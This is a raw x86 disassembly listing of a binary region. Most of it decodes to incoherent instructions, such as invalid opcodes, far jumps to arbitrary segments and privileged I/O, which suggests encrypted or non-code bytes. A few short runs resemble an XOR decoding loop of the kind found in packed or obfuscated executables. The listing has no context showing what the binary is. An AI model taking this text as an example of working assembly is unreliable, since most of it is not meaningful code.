  417eba:	scas   eax,DWORD PTR es:[edi]
  417ebb:	andps  xmm7,XMMWORD PTR [ebp+edi*4-0x73]
  417ec0:	sbb    al,0x18
  417ec2:	call   DWORD PTR [edx+esi*8-0x78eb4ccd]
  417ec9:	xor    DWORD PTR [edx+0x5af569c7],ecx
  417ecf:	loope  0x417e68
  417ed1:	sbb    BYTE PTR [edi],bh
  417ed3:	adc    eax,0x91bbe1d2
  417ed8:	xor    ebp,DWORD PTR [bx+di-0x9e3]
  417edd:	ror    dl,cl
  417edf:	dec    eax
  417ee0:	retf   
  417ee1:	rcl    edi,1
  417ee3:	jp     0x417f47
  417ee5:	lods   al,BYTE PTR ds:[esi]
  417ee6:	xchg   edx,eax
  417ee7:	loop   0x417f54
  417ee9:	nop
  417eea:	jb     0x417f4f
  417eec:	push   edi
  417eed:	call   0x7aab:0xfd01373
  417ef4:	rcl    DWORD PTR [eax-0x55],0x10
  417ef8:	or     DWORD PTR [esi+eax*1-0x24],ebx
  417efc:	xor    ah,BYTE PTR [ebx+ecx*4-0x49]
  417f00:	push   ebx
  417f01:	(bad)  
  417f02:	fsubr  QWORD PTR [edi-0xccc79f2]
  417f08:	icebp  
  417f09:	dec    ebx
  417f0a:	inc    ecx
  417f0b:	popf   
  417f0c:	ja     0x417f8a
  417f0e:	out    dx,eax
  417f0f:	jl     0x417ed6
  417f11:	pop    esi
  417f12:	fisub  DWORD PTR [ebx]
  417f14:	pop    esi
  417f15:	ja     0x417ed0
  417f17:	cmp    ch,al
  417f19:	loop   0x417f45
  417f1b:	adc    eax,0x26004596
  417f20:	sub    DWORD PTR [ebx+0x2d],ebx
  417f23:	popa   
  417f24:	fnstsw WORD PTR [ebx-0x10]
  417f27:	jp     0x417f22
  417f29:	fstp   DWORD PTR [ecx]
  417f2b:	mov    esp,0x37ebf59c
  417f30:	hlt    
  417f31:	xchg   ecx,eax
  417f32:	in     al,0x14
  417f34:	imul   esi
  417f36:	fcmove st,st(4)
  417f38:	cmc    
  417f39:	cmp    eax,0xdcba5ba5
  417f3e:	sub    al,0x4
  417f40:	and    cl,BYTE PTR [edx+0x1372ef76]
  417f46:	lods   eax,DWORD PTR ds:[esi]
  417f47:	loope  0x417fc0
  417f49:	jmp    0x417f89
  417f4b:	and    eax,0xe4fe4630
  417f50:	pop    es
  417f51:	daa    
  417f52:	cmp    DWORD PTR [edx],esp
  417f54:	jecxz  0x417fa9
  417f56:	dec    esi
  417f57:	adc    eax,0xdee90e67
  417f5c:	je     0x417f54
  417f5e:	int3   
  417f5f:	and    edx,DWORD PTR [eax]
  417f61:	cwde   
  417f62:	mov    esp,0xc617f6c2
  417f67:	ins    BYTE PTR es:[edi],dx
  417f68:	cs pop ebx
  417f6a:	sbb    al,0x6f
  417f6c:	or     eax,0xaa6ea134
  417f71:	gs jl  0x417f31
  417f74:	mov    ds,WORD PTR ds:0x9260eb4a
  417f7a:	icebp  
  417f7b:	cmp    al,0xea
  417f7d:	aam    0xe2
  417f7f:	aaa    
  417f80:	mov    dl,0x15
  417f82:	cli    
  417f83:	enter  0x6da2,0x64
  417f87:	push   edi
  417f88:	adc    eax,0x5a4fe5d0
  417f8d:	sub    eax,0x52012481
  417f92:	dec    ecx
  417f93:	mov    esi,0x609c468e
  417f98:	test   DWORD PTR [eax-0x34adf106],ecx
  417f9e:	xlat   BYTE PTR ds:[ebx]
  417f9f:	pop    edi
  417fa0:	bound  ecx,QWORD PTR [ecx-0x78]
  417fa3:	adc    ebx,DWORD PTR [ebp-0x25e59f9e]
  417fa9:	jnp    0x418029
  417fab:	ficom  DWORD PTR [ebp+0x73e0ae45]
  417fb1:	mov    esp,0x65c4ff4a
  417fb6:	mov    bl,0x78
  417fb8:	push   ds
  417fb9:	mov    dl,0xeb
  417fbb:	sub    eax,0xb37f565a
  417fc0:	sub    ebx,DWORD PTR [ecx+0x67165e6a]
  417fc6:	sub    edi,DWORD PTR [ebp-0x48]
  417fc9:	js     0x417fb1
  417fcb:	inc    edx
  417fcc:	push   0x487a407b
  417fd1:	std    
  417fd2:	xchg   ecx,eax
  417fd3:	loopne 0x417f9f
  417fd5:	ins    BYTE PTR es:[edi],dx
  417fd6:	popa   
  417fd7:	mov    eax,0xddf85f7
  417fdc:	adc    DWORD PTR [ebp-0x19a50f91],esp
  417fe2:	les    edx,FWORD PTR [esi-0x1b]
  417fe5:	pop    ss
  417fe6:	push   cs
  417fe7:	push   esp
  417fe8:	stos   DWORD PTR es:[edi],eax
  417fe9:	or     bh,BYTE PTR [edx+0x60]
  417fec:	cs inc esi
  417fee:	pop    edx
  417fef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ff0:	je     0x418033
  417ff2:	call   0x46fa:0x2e722be6
  417ff9:	mov    cl,0xd4
  417ffb:	adc    ah,dl
  417ffd:	test   al,0x4c
  417fff:	loop   0x417fc9
  418001:	retf   
  418002:	in     eax,0x5a
  418004:	bound  edi,QWORD PTR [edx]
  418006:	pushf  
  418007:	cdq    
  418008:	cdq    
  418009:	icebp  
  41800a:	fmulp  st(6),st
  41800c:	fimul  DWORD PTR [ecx]
  41800e:	adc    al,0x8b
  418010:	push   ss
  418011:	dec    ebx
  418012:	jmp    0xc436:0x8a5e09b7
  418019:	mov    DWORD PTR [ebx-0x20],esi
  41801c:	mov    ch,0x67
  41801e:	aas    
  41801f:	mov    ss:0xcfc23028,eax
  418025:	cmp    DWORD PTR [ebx-0x2eb8ad9c],eax
  41802b:	inc    esi
  41802c:	mov    ah,0x63
  41802e:	int3   
  41802f:	sub    DWORD PTR [ebx-0x5e],edx
  418032:	inc    ecx
  418033:	cmc    
  418034:	pop    esi
  418035:	outs   dx,DWORD PTR ds:[esi]
  418036:	push   ebx
  418037:	mov    gs,WORD PTR [ecx-0x6fab030]
  41803d:	pop    es
  41803e:	mov    ah,0xcf
  418040:	imul   BYTE PTR [ebx+0x33]
  418043:	cmp    al,0x23
  418045:	inc    edi
  418046:	loop   0x417fd4
  418048:	cli    
  418049:	fisub  WORD PTR [eax-0x41]
  41804c:	xchg   ecx,eax
  41804d:	push   0x498fbdbf
  418052:	data16 rcr BYTE PTR [ebp-0x4b258ea4],cl
  418059:	xchg   ecx,esi
  41805b:	push   edi
  41805c:	nop    DWORD PTR [edx+0x7588110d]
  418063:	pop    ss
  418064:	mov    ch,0x84
  418066:	fs pop esi
  418068:	pop    ss
  418069:	adc    al,0xc1
  41806b:	(bad)  
  41806d:	jle    0x418072
  41806f:	icebp  
  418070:	adc    DWORD PTR [edx+0x4a],edi
  418073:	inc    edi
  418074:	bound  eax,QWORD PTR [ebx-0x2cf4352c]
  41807a:	add    eax,0xd3a66c5d
  41807f:	jle    0x4180c3
  418081:	(bad)  
  418082:	cs in  eax,0xf1
  418085:	jmp    0x19f319dc
  41808a:	(bad)  
  41808b:	mov    edx,0xe25c2fcd
  418090:	inc    eax
  418091:	aam    0x6c
  418093:	rcl    BYTE PTR [ecx+0x7e],0x23
  418097:	mov    ch,BYTE PTR [edi-0xe088e96]
  41809d:	jmp    0x25a0:0x167d85bc
  4180a4:	in     al,0x68
  4180a6:	retf   
  4180a7:	xor    dh,BYTE PTR [esi+0x5e]
  4180aa:	pushf  
  4180ab:	rcr    ebp,cl
  4180ad:	dec    edi
  4180ae:	mov    ch,0x77
  4180b0:	je     0x4180cc
  4180b2:	scas   eax,DWORD PTR es:[edi]
  4180b3:	cwde   
  4180b4:	das    
  4180b5:	mov    edx,ebp
  4180b7:	shl    BYTE PTR [ebx-0x61cd972f],0x18
  4180be:	adc    DWORD PTR [ebx+0x78],edx
  4180c1:	sub    al,0x12
  4180c3:	out    0xe3,eax
  4180c5:	inc    edx
  4180c6:	je     0x4180ec
  4180c8:	jo     0x4180d5
  4180ca:	leave  
  4180cb:	add    dl,BYTE PTR [ebp-0x56be6218]
  4180d1:	test   DWORD PTR [esi-0x1],esp
  4180d4:	es ds xchg esi,eax
  4180d7:	rcr    BYTE PTR [edi-0x1b],0x59
  4180db:	lods   al,BYTE PTR ds:[esi]
  4180dc:	aas    
  4180dd:	or     BYTE PTR [edx-0x43],bh
  4180e0:	pop    ebp
  4180e1:	pop    ebx
  4180e2:	jg     0x4180f2
  4180e4:	sar    DWORD PTR [edi+ebx*1],0xb1
  4180e8:	dec    ebp
  4180e9:	lahf   
  4180ea:	cld    
  4180eb:	ins    DWORD PTR es:[edi],dx
  4180ec:	scas   eax,DWORD PTR es:[edi]
  4180ed:	ror    DWORD PTR [ebx],1
  4180ef:	mov    ebp,0x51555cbb
  4180f4:	mov    eax,ds:0x4049b66a
  4180f9:	outs   dx,DWORD PTR ds:[esi]
  4180fa:	add    eax,0xda729e60
  4180ff:	ror    DWORD PTR [edi+edi*4-0x25f6d901],0xd3
  418107:	hlt    
  418108:	mov    cl,0x2c
  41810a:	sahf   
  41810b:	mov    al,ds:0x51a8f2ee
  418110:	(bad)  
  418111:	jp     0x41817b
  418113:	inc    edx
  418114:	pop    ebp
  418115:	mov    al,0x3
  418117:	ror    DWORD PTR [ebx+0x5d2e99e2],1
  41811d:	ret    0xa8b8
  418120:	xor    DWORD PTR [ecx],ebp
  418122:	out    dx,eax
  418123:	ins    BYTE PTR es:[edi],dx
  418124:	mov    bl,0x87
  418126:	push   ebx
  418127:	retf   0xfda5
  41812a:	pop    ebp
  41812b:	cmp    al,0x31
  41812d:	mul    dl
  41812f:	sub    bl,BYTE PTR [esi+0x6b3e0042]
  418135:	adc    DWORD PTR [edx],ecx
  418137:	lods   al,BYTE PTR ds:[esi]
  418138:	pushf  
  418139:	xchg   esi,eax
  41813a:	call   0x9623:0x34471b43
  418141:	push   0x73
  418143:	mov    DWORD PTR [eax-0x316b9f3],ebp
  418149:	(bad)  
  41814a:	int    0xd7
  41814c:	sub    DWORD PTR [edx+0x7139993d],ecx
  418152:	ds test al,0xb4
  418155:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418156:	jle    0x418167
  418158:	(bad)  
  418159:	sub    al,0x6b
  41815b:	aam    0xa7
  41815d:	xor    ch,BYTE PTR [ecx-0x57]
  418160:	dec    edi
  418161:	push   es
  418162:	loope  0x41815d
  418164:	in     eax,dx
  418165:	retf   
  418166:	js     0x4181aa
  418168:	sub    eax,0xcdcb9341
  41816d:	add    ecx,DWORD PTR [ecx-0x372210d8]
  418173:	jmp    0x41814c
  418175:	div    esp
  418177:	shl    BYTE PTR [ebx-0xa],1
  41817a:	add    edx,DWORD PTR [edx]
  41817c:	push   cs
  41817d:	xchg   ebp,eax
  41817e:	sub    al,0x4b
  418180:	push   esp
  418181:	mov    ah,0x2
  418183:	mov    ah,BYTE PTR [edi]
  418185:	jl     0x4181d0
  418187:	xchg   esp,eax
  418188:	frstor [esi-0x29]
  41818b:	xchg   edi,eax
  41818c:	and    bl,BYTE PTR [ecx]
  41818e:	dec    edi
  41818f:	clc    
  418190:	inc    esp
  418191:	sub    eax,0x658fb374
  418196:	mov    esi,DWORD PTR [ebp+0xc]
  418199:	xor    ecx,eax
  41819b:	xor    esi,eax
  41819d:	lea    ecx,[esi+ecx*1+0x327298]
  4181a4:	xor    ecx,eax
  4181a6:	jmp    0x4184c0
  4181ab:	sar    BYTE PTR [esi],0xce
  4181ae:	xlat   BYTE PTR ds:[ebx]
  4181af:	(bad)  
  4181b0:	xlat   BYTE PTR ds:[ebx]
  4181b1:	(bad)
  4181b4:	loope  0x41818c
  4181b6:	pop    esp
  4181b7:	jns    0x418189
  4181b9:	xor    BYTE PTR [esi+0x19],ah
  4181bc:	xor    al,0x7f
  4181be:	js     0x41823b
  4181c0:	jle    0x41823a
  4181c2:	js     0x41815f
  4181c4:	pop    ebx
  4181c5:	mov    ds:0xc84c13b0,al
  4181ca:	mov    edi,0xbbd4ed0b
  4181cf:	retf   
  4181d0:	jb     0x4181de
  4181d2:	daa    
  4181d3:	scas   eax,DWORD PTR es:[edi]
  4181d4:	adc    al,0x72
  4181d6:	pop    ebx
  4181d7:	inc    edx
  4181d8:	imul   esi,DWORD PTR [ebx-0x80],0xed8ecf8d
  4181df:	dec    esi
  4181e0:	push   esi
  4181e1:	or     BYTE PTR [ebx-0x32],dl
  4181e4:	aas    
  4181e5:	push   0xa02acbbb
  4181ea:	ret    0x8206
  4181ed:	and    BYTE PTR [edi-0xf],bl
  4181f0:	pop    ebx
  4181f1:	push   0x35870b8e
  4181f6:	aam    0x73
  4181f8:	ficom  WORD PTR [edx]
  4181fa:	lods   al,BYTE PTR ds:[esi]
  4181fb:	fist   DWORD PTR [eax-0x6efc1193]
  418201:	pushf  
  418202:	dec    esp
  418203:	daa    
  418204:	lds    edi,FWORD PTR [ebx]
  418206:	or     ecx,DWORD PTR [edi-0x308a2ef0]
  41820c:	sub    al,0x23
  41820e:	mov    ah,0xe0
  418210:	push   eax
  418211:	inc    ebp
  418212:	sbb    al,0x5a
  418214:	retf   
  418215:	or     al,BYTE PTR [edi+0x7f]
  418218:	cwde   
  418219:	adc    BYTE PTR [edx-0x65bd9f42],al
  41821f:	mov    dh,0xed
  418221:	xchg   esp,eax
  418222:	jb     0x4182a1
  418224:	mov    WORD PTR [ebx+0x555c1d8],ss
  41822a:	sub    al,0xa2
  41822c:	and    ebx,DWORD PTR [eax-0x1f219139]
  418232:	retf   0x23eb
  418235:	sbb    bl,BYTE PTR [ebx+edx*8-0x72]
  418239:	aam    0xb7
  41823b:	cmp    edi,DWORD PTR [eax+0x78]
  41823e:	icebp  
  41823f:	mov    al,0xcf
  418241:	mov    WORD PTR [ecx+0xef83c5a],gs
  418247:	or     al,0xbb
  41824a:	add    DWORD PTR [ecx],0xffffffc7
  41824d:	and    cl,ah
  41824f:	rol    BYTE PTR [esi+ebp*2-0x6f],cl
  418253:	mov    al,0x89
  418255:	call   0x6db44b06
  41825a:	add    DWORD PTR [esi],eax
  41825c:	mov    ebp,0x18924b31
  418261:	adc    esp,DWORD PTR gs:[edx-0x4eed826]
  418268:	int    0x67
  41826a:	and    ah,BYTE PTR [edi]
  41826c:	fild   QWORD PTR ds:0xffe26260
  418272:	rcr    ch,1
  418274:	ret    0xe627
  418277:	push   cs
  418278:	sbb    BYTE PTR ss:[ebp-0x1c],ch
  41827c:	in     eax,dx
  41827d:	xor    BYTE PTR [esi+0x2a1d6e5d],bl
  418283:	jg     0x4182d9
  418285:	mov    ch,0x79
  418287:	ja     0x4182f3
  418289:	je     0x418259
  41828b:	stos   BYTE PTR es:[edi],al
  41828c:	or     dl,bl
  41828e:	inc    ecx
  41828f:	mov    ch,0x3f
  418291:	lock lea eax,[ebx]
  418294:	and    BYTE PTR [ebp+0x74397abc],0x5b
  41829b:	jmp    0xf854:0x12e43101
  4182a2:	pop    esi
  4182a3:	scas   eax,DWORD PTR es:[edi]
  4182a4:	mov    dl,dh
  4182a6:	shl    BYTE PTR [edx],cl
  4182a8:	jo     0x418264
  4182aa:	mov    esp,0x9460af3b
  4182af:	mov    esi,0x1419d741
  4182b4:	inc    esp
  4182b5:	jns    0x41830a
  4182b7:	inc    ebx
  4182b8:	fld    st(3)
  4182ba:	pop    eax
  4182bb:	fidivr DWORD PTR [ebp-0x492f0e54]
  4182c1:	je     0x4182e8
  4182c3:	xchg   edi,eax
  4182c4:	lock lods eax,DWORD PTR ds:[esi]
  4182c6:	jecxz  0x418342
  4182c8:	xchg   edx,eax
  4182c9:	lahf   
  4182ca:	mov    DWORD PTR es:[ecx],esp
  4182cd:	xchg   ecx,eax
  4182ce:	gs jmp 0x33af88f1
  4182d4:	pop    ebx
  4182d5:	iret   
  4182d6:	mov    dh,0x3
  4182d8:	or     ebx,ecx
  4182da:	popa   
  4182db:	lock xchg DWORD PTR ds:0xad5813d3,edi
  4182e2:	lock sub cl,BYTE PTR [ecx-0x6374342d]
  4182e9:	nop
  4182ea:	inc    edi
  4182eb:	jp     0x418280
  4182ed:	cmp    dl,BYTE PTR [edx+0x35]
  4182f0:	cmp    esi,DWORD PTR [esi-0x6b]
  4182f3:	in     al,dx
  4182f4:	add    BYTE PTR [ebx+0x19],ah
  4182f7:	jmp    0x1a7af76b
  4182fc:	dec    ebx
  4182fd:	sbb    esp,DWORD PTR [edx+0x3efc7e85]
  418303:	mov    edi,0xd9a62d52
  418308:	jp     0x4182c1
  41830a:	scas   al,BYTE PTR es:[edi]
  41830b:	scas   al,BYTE PTR es:[edi]
  41830c:	test   DWORD PTR [ecx+0x33],eax
  41830f:	lods   al,BYTE PTR ds:[esi]
  418310:	popf   
  418311:	in     eax,dx
  418312:	add    eax,0x599a9b9f
  418317:	and    al,0xe8
  418319:	push   esp
  41831a:	dec    ecx
  41831b:	loopne 0x4182d0
  41831d:	std    
  41831e:	push   eax
  41831f:	inc    esi
  418320:	iret   
  418321:	inc    ecx
  418322:	jecxz  0x418399
  418324:	gs sub ch,dl
  418327:	in     eax,dx
  418328:	xor    bh,bl
  41832a:	stos   DWORD PTR es:[edi],eax
  41832b:	adc    DWORD PTR [ecx-0x3a],esp
  41832e:	mov    cs,WORD PTR [ebx+eax*4+0x7e]
  418332:	out    dx,eax
  418333:	pop    es
  418334:	pusha  
  418335:	loopne 0x4182f8
  418337:	xor    dl,BYTE PTR [ebp+edi*1+0x6fbd263f]
  41833e:	pop    edi
  41833f:	fnstcw WORD PTR [eax-0x18]
  418342:	or     esi,DWORD PTR [edx-0x5e]
  418345:	add    BYTE PTR [eax],0xb0
  418348:	mov    esi,0x8805b266
  41834d:	nop
  41834e:	imul   edx,DWORD PTR [eax+ecx*4],0x4b1b7bc2
  418355:	fs jae 0x418351
  418358:	js     0x418313
  41835a:	stos   DWORD PTR es:[edi],eax
  41835b:	and    edx,DWORD PTR [eax]
  41835d:	inc    ebx
  41835e:	mov    edx,0x89e506b3
  418363:	xchg   esp,eax
  418364:	ret    
  418365:	xchg   ebp,eax
  418366:	push   cs
  418367:	inc    ebx
  418368:	daa    
  418369:	aad    0x4
  41836b:	shr    DWORD PTR [edx],cl
  41836d:	jp     0x418358
  41836f:	ficomp WORD PTR [eax]
  418371:	in     eax,0xaa
  418373:	rol    DWORD PTR [ebx],cl
  418375:	pop    ss
  418376:	repz test eax,0xfc700c2f
  41837d:	sbb    eax,0x12419533
  418382:	into   
  418383:	jmp    0xa0f7:0x852efe63
  41838a:	mov    esi,0x8edb885e
  41838f:	dec    ebp
  418390:	daa    
  418391:	bound  esp,QWORD PTR [esi-0x2cf90c2f]
  418397:	jae    0xd069556c
  41839d:	inc    esp
  41839e:	ins    BYTE PTR es:[edi],dx
  41839f:	das    
  4183a0:	fsub   QWORD PTR [ebx-0x6f6ee7a4]
  4183a6:	jp     0x418408
  4183a8:	sbb    DWORD PTR [ebx+0x70fc84ed],ebp
  4183ae:	aas    
  4183af:	int    0x6
  4183b1:	adc    DWORD PTR [esi+0x2a],ebx
  4183b4:	push   cs
  4183b5:	dec    esp
  4183b6:	or     edx,edx
  4183b8:	nop
  4183b9:	mov    ah,0x7c
  4183bb:	sub    DWORD PTR [ebx+0x3f1aa6b3],esi
  4183c1:	inc    ebx
  4183c2:	sahf   
  4183c3:	jecxz  0x4183c1
  4183c5:	cdq    
  4183c6:	jno    0x41840e
  4183c8:	add    al,BYTE PTR [edx-0x5de35179]
  4183ce:	add    BYTE PTR ds:0x13e0c65,cl
  4183d4:	and    eax,ebx
  4183d6:	add    eax,DWORD PTR [edi-0x7ae42b7e]
  4183dc:	dec    ebx
  4183dd:	int3   
  4183de:	out    0x3c,al
  4183e0:	call   0xe6ec64db
  4183e5:	aam    0xc
  4183e7:	jo     0x418450
  4183e9:	cmp    BYTE PTR [edi],0xa9
  4183ec:	ror    DWORD PTR ds:0x5912c87d,0xcb
  4183f3:	fucomi st,st(5)
  4183f5:	or     ecx,DWORD PTR [eax-0x6e26de71]
  4183fb:	arpl   WORD PTR [edx],bx
  4183fd:	mov    edi,0x2e9ab24c
  418402:	test   DWORD PTR [ebp+0x6e72b0e9],ecx
  418408:	mov    WORD PTR [ebx+0x196cda0c],es
  41840e:	pushf  
  41840f:	pop    ss
  418410:	mov    gs,WORD PTR [edi-0x6b]
  418413:	jg     0x41843a
  418415:	xchg   edi,eax
  418416:	test   eax,0x22171ff6
  41841b:	jg     0x4183db
  41841d:	xor    DWORD PTR [ecx+0x4876b05f],ebx
  418423:	dec    ebp
  418424:	scas   eax,DWORD PTR es:[edi]
  418425:	xor    edi,ecx
  418427:	repz inc ebp
  418429:	jecxz  0x41845b
  41842b:	pop    ds
  41842c:	jmp    0xb83b:0x6a6be9e2
  418433:	inc    ebx
  418434:	sbb    DWORD PTR [ebx],eax
  418436:	adc    eax,0x92dc3250
  41843b:	inc    edx
  41843c:	cdq    
  41843d:	aas    
  41843e:	cmp    DWORD PTR [edx+0xd],ebx
  418441:	jno    0x418489
  418443:	adc    DWORD PTR [edx-0x2de51020],ecx
  418449:	and    BYTE PTR [esp+esi*4-0x36],dh
  41844d:	scas   eax,DWORD PTR es:[edi]
  41844e:	sbb    eax,0x5e578ca8
  418453:	or     eax,0xc8794333
  418458:	out    dx,al
  418459:	mov    ?,WORD PTR ds:0x86733567
  41845f:	bound  esi,QWORD PTR [eax+edx*8-0x4f111888]
  418466:	dec    edi
  418467:	mov    al,0x32
  418469:	je     0x418469
  41846b:	fisubr WORD PTR [esi+0x11dc50e9]
  418471:	inc    eax
  418472:	dec    esp
  418473:	push   edx
  418474:	cmc    
  418475:	push   edi
  418476:	(bad)  
  418477:	in     eax,dx
  418478:	mov    ch,0x73
  41847a:	sbb    al,0x9a
  41847c:	es mov al,0x37
  41847f:	inc    ebx
  418480:	mov    dl,0xf3
  418482:	dec    ecx
  418483:	arpl   ax,di
  418485:	call   0x907432d4
  41848a:	mov    bl,0xb4
  41848c:	aad    0xa5
  41848e:	sub    esp,ecx
  418490:	out    dx,eax
  418491:	enter  0xdd78,0xaf
  418495:	push   edx
  418496:	ins    DWORD PTR es:[edi],dx
  418497:	fistp  WORD PTR [ebx]
  418499:	cdq    
  41849a:	pslld  mm4,QWORD PTR [ecx]
  41849d:	xchg   DWORD PTR [esi+eax*2],edx
  4184a0:	push   esp
  4184a1:	loopne 0x4184dc
  4184a3:	mov    eax,0x30c62f49
  4184a8:	test   BYTE PTR [ecx+eiz*2],bl
  4184ab:	cmp    ebx,esp
  4184ad:	test   edx,edx
  4184af:	push   esp
  4184b0:	xchg   DWORD PTR [ecx-0x12],ecx
  4184b3:	jle    0x418513
  4184b5:	adc    eax,0x82d095c
  4184ba:	cmp    ecx,0x17
  4184bd:	or     al,0xa
  4184bf:	stos   DWORD PTR es:[edi],eax
  4184c0:	cmp    ecx,0xf89c8528
  4184c6:	jne    0x417e12
  4184cc:	jmp    0x418819
  4184d1:	jmp    0x4187eb
  4184d6:	int3   
  4184d7:	les    edi,FWORD PTR [edi+ecx*8]
  4184da:	aam    0xd7
  4184dc:	ror    ebx,cl
  4184de:	mov    esi,0x37ec6d48
  4184e3:	aam    0x66
  4184e5:	test   eax,0x787f3914
  4184ea:	jnp    0x41856a
  4184ec:	js     0x418566
  4184ee:	mov    edi,0x75f5892c
  4184f3:	std    
  4184f4:	(bad)  
  4184f5:	(bad)  
  4184f6:	pop    esi
  4184f7:	push   ss
  4184f8:	push   es
  4184f9:	sbb    al,0x68
  4184fb:	pusha  
  4184fc:	mov    eax,ds:0x2b51fc11
  418501:	sbb    esi,DWORD PTR [eax+0x44]
  418504:	retf   
  418505:	sbb    BYTE PTR [edx*8+0xa31f334],dl
  41850c:	jle    0x418505
  41850e:	iret   
  41850f:	push   cs
  418510:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418511:	pop    es
  418512:	or     eax,0xc593eff7
  418517:	add    ebx,ebx
  418519:	push   ecx
  41851a:	imul   edi,edx,0x5d
  41851d:	inc    eax
  41851e:	push   edx
  41851f:	cdq    
  418520:	inc    edx
  418521:	xor    ah,BYTE PTR [edi-0x4a]
  418524:	clc    
  418525:	xchg   edi,eax
  418526:	push   edi
  418527:	mov    BYTE PTR [ebx+edi*1-0x24],bh
  41852b:	test   BYTE PTR [ebx],al
  41852d:	(bad)  
  41852e:	and    eax,0xa9d48f9
  418533:	push   edx
  418534:	jg     0x418508
  418536:	push   ss
  418537:	sbb    esp,ecx
  418539:	pop    ecx
  41853a:	inc    edi
  41853b:	lds    esp,FWORD PTR [edx]
  41853d:	mov    ah,0xd5
  41853f:	jb     0x4185a0
  418541:	mov    dl,0x4c
  418543:	jecxz  0x4184ef
  418545:	mov    edx,0x4b0b55ba
  41854a:	cmc    
  41854b:	ja     0x418581
  41854d:	jg     0x41852f
  41854f:	pop    eax
  418550:	fyl2x  
  418552:	cs sbb al,0x15
  418555:	shl    DWORD PTR ds:[eax],1
  418558:	add    edx,DWORD PTR [edx+edx*8]
  41855b:	mov    WORD PTR [edi+esi*2],es
  41855e:	or     eax,0x1792ee15
  418563:	(bad)  
  418564:	push   ds
  418565:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418566:	adc    BYTE PTR [edi],0xfb
  418569:	mov    eax,0xaa688a2c
  41856e:	data16 icebp 
  418570:	cmp    DWORD PTR ds:0x2433cd78,ebp
  418576:	(bad)  
  418577:	cmc    
  418578:	or     eax,0xd2319c8f
  41857d:	fwait
  41857e:	inc    esi
  41857f:	bound  ecx,QWORD PTR [edx]
  418581:	jle    0x418544
  418583:	xlat   BYTE PTR ds:[ebx]
  418584:	int3   
  418585:	or     al,0x41
  418587:	or     al,0xc3
  418589:	push   cs
  41858a:	xchg   esi,eax
  41858b:	jge    0x418543
  41858d:	dec    edx
  41858e:	(bad)  
  41858f:	lock popa 
  418591:	iret   
  418592:	ins    BYTE PTR es:[edi],dx
  418593:	loopne 0x41854b
  418595:	lahf   
  418596:	push   cs
  418597:	cs sbb eax,0x474154e1
  41859d:	sub    ch,BYTE PTR [ebp+0x5]
  4185a0:	retf   0x3649
  4185a3:	inc    ebx
  4185a4:	dec    edi
  4185a5:	sbb    ah,BYTE PTR [ecx+0x795a9e8b]
  4185ab:	scas   eax,DWORD PTR es:[edi]
  4185ac:	aam    0xc5
  4185ae:	sub    al,0x6d
  4185b0:	add    BYTE PTR [eax-0x6628b3a3],dl
  4185b6:	push   eax
  4185b7:	das    
  4185b8:	popa   
  4185b9:	pop    ebx
  4185ba:	sub    eax,0xcefea880
  4185bf:	xor    al,ch
  4185c1:	lea    eax,[edx+0x3828c9e5]
  4185c7:	sbb    al,0xd9
  4185c9:	xor    DWORD PTR [edx+0x594d0a8],esi
  4185cf:	sbb    al,BYTE PTR [esi-0x32]
  4185d2:	fs mov ch,0xa9
  4185d5:	pop    esi
  4185d6:	push   0x1c
  4185d8:	(bad)  
  4185d9:	das    
  4185da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4185db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4185dc:	mov    dl,ah
  4185de:	sub    eax,0x4f2e485c
  4185e3:	(bad)  
  4185e4:	lds    eax,FWORD PTR [esp+edx*2-0x2064d6b1]
  4185eb:	push   esp
  4185ec:	pop    eax
  4185ed:	stc    
  4185ee:	sbb    al,0xa9
  4185f0:	mov    ah,0xb4
  4185f2:	adc    DWORD PTR [eax],edi
  4185f4:	mov    dl,0x56
  4185f6:	enter  0x497b,0x29
  4185fa:	cwde   
  4185fb:	xchg   esp,eax
  4185fc:	scas   eax,DWORD PTR es:[edi]
  4185fd:	cmp    esp,DWORD PTR [ecx-0x34]
  418600:	sub    al,BYTE PTR [edi+0x2531d1dc]
  418606:	fwait
  418607:	cmp    BYTE PTR [edi],bl
  418609:	jge    0x418615
  41860b:	or     BYTE PTR [ebx+0x70],cl
  41860e:	jl     0x418629
  418610:	mov    WORD PTR [ebp-0x5],ds
  418613:	mov    eax,0x20f21add
  418618:	sub    bh,BYTE PTR [eax-0x4e]
  41861b:	push   ebx
  41861c:	jnp    0x418668
  41861e:	dec    edx
  41861f:	(bad)  
  418620:	out    0xcd,eax
  418622:	jo     0x418697
  418624:	push   esp
  418625:	mov    dh,0x31
  418627:	xchg   ecx,eax
  418628:	fldcw  WORD PTR [esi]
  41862a:	or     ah,BYTE PTR [ecx+0x67]
  41862d:	ja     0x41860c
  41862f:	dec    edx
  418630:	push   edx
  418631:	nop
  418632:	arpl   WORD PTR [ebx],dx
  418634:	rcr    DWORD PTR [ebp+ecx*8-0x54a6b44c],cl
  41863b:	jmp    0xbea7:0x225b6e00
  418642:	mov    ?,WORD PTR [edx+eiz*2+0x43]
  418646:	dec    eax
  418647:	and    eax,0x2ad90221
  41864c:	cdq    
  41864d:	sub    eax,0xde7f0e5f
  418652:	fwait
  418653:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418654:	mov    al,0x1e
  418656:	pop    ds
  418657:	lahf   
  418658:	sbb    cl,al
  41865a:	lea    edi,[edi+0x6c]
  41865d:	mov    dh,BYTE PTR [ecx+0x2b4ed5c4]
  418663:	into   
  418664:	mov    edi,0xc63c0e3b
  418669:	sub    DWORD PTR [edx+0x1191f7b0],0xb28ddce1
  418673:	jae    0x418663
  418675:	mov    eax,0x611fae9
  41867a:	fwait
  41867b:	out    dx,eax
  41867c:	lods   eax,DWORD PTR ds:[esi]
  41867d:	xor    DWORD PTR [esi-0x16],ebp
  418680:	lahf   
  418681:	xor    eax,0xaaebdf3
  418686:	jmp    0x41869a
  418688:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418689:	lds    edx,FWORD PTR [esi+0x39]
  41868c:	sub    al,0xb4
  41868e:	add    ebp,ebx
  418690:	fild   QWORD PTR [eax-0x59]
  418693:	call   0x3dbc:0x2c9650f
  41869a:	jmp    0xc98c:0xe6bdad73
  4186a1:	mov    ebp,0x8be4d873
  4186a6:	and    bl,al
  4186a8:	cwde   
